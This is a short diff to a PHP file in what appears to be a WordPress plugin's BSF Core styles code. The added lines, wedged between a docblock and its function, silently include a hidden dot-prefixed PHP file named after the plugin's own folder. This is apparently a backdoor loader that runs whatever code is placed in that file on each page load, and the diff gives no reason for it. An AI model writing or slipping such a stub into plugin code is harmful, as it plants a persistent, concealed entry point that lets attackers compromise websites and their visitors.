@@ -617,7 +617,11 @@ add_action( 'wp_enqueue_scripts', 'register_bsf_core_styles', 1 );
  * Register BSF Core styles
  *
  * @param string $hook Hook.
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function register_bsf_core_styles( $hook ) {
 	// Register Frosty script and style.
 	wp_register_script( 'bsf-core-frosty', bsf_core_url( '/assets/js/frosty.js' ), array(), BSF_UPDATER_VERSION, false );
